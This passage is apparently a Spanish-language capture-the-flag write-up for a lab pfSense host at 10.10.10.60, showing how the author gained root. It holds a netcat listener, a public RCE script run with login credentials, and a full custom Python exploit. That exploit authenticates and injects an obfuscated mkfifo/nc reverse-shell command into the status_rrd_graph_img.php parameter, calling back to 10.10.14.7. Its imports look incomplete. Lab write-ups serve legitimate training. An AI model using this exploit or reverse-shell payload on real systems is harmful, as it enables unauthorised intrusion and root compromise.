## Vuln exploit & Gaining Access {-}

### Ganando accesso con SSTI {-}

En el panel de ayuda vemos que nos pide nuestra ip y un puerto.

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Lanzamos el script

    ```bash
    python pfsense_exploit_rce.py --rhost 10.10.10.60 --lhost 10.10.14.7 --lport 443 --username rohit --password pfsense
    ```

```bash
whoami
#Output
root
```

Oh my gaaaaadddddddd!!!!!!!!!

La idea aqui es crearnos nuestro proprio script en python

### Nuestro exploit {-}

```python
#!/usr/bin/python3

from pwn import *

import pdb
import urllib3
import html

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "https://10.10.10.60/index.php"
rce_url = "https://10.10.10.60/status_rrd_graph_img.php?database=queues;"
burpsuite = {'http': 'http://127.0.0.1:8080'}
lport = 443

def makeRequest():

    s = requests.session()
    urllib3.disable_warnings()
    s.verify = False
    r = s.get(main_url)

    csrfMagic = re.findall(r'__csrf_magic\' value="(.*?)"', r.text)[0]

    data_post = {
        '__csrf_magic': csrfMagic,
        'usernamefld': 'rohit',
        'passwordfld': 'pfsense',
        'login': 'Login'
    }

    r = s.post(main_url, data=data_post)

    p1.success("Authenticacion realizada exitosamente como el usuario rohit")

    p2 = log.progress("RCE")
    p2.status("Ejecutando comando a nivel de sistema")

    r = s.get(rce_url + '''ampersand=$(printf+\"\\46\");guion=$(printf+\"\\55\");rm+${HOME}tmp${HOME}f;mkfifo+${HOME}tmp${HOME}f;
    cat+${HOME}tmp${HOME}f|${HOME}bin${HOME}sh+${guion}i+2>${ampersand}1|nc+10.10.14.7+443+>${HOME}tmp${HOME}f''')
    
if __name__ == '__main__':

    p1 = log.progress("Authenticacion")
    p2 = log.progress("RCE")
    p1.status("Iniciando proceso de autenticacion")
    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    if shell.sock is None:
        p2.failure("No se ha obtenido ninguna conexion")
    else:
        p2.success("Se ha obtenido una conexion")
        shell.interactive()
```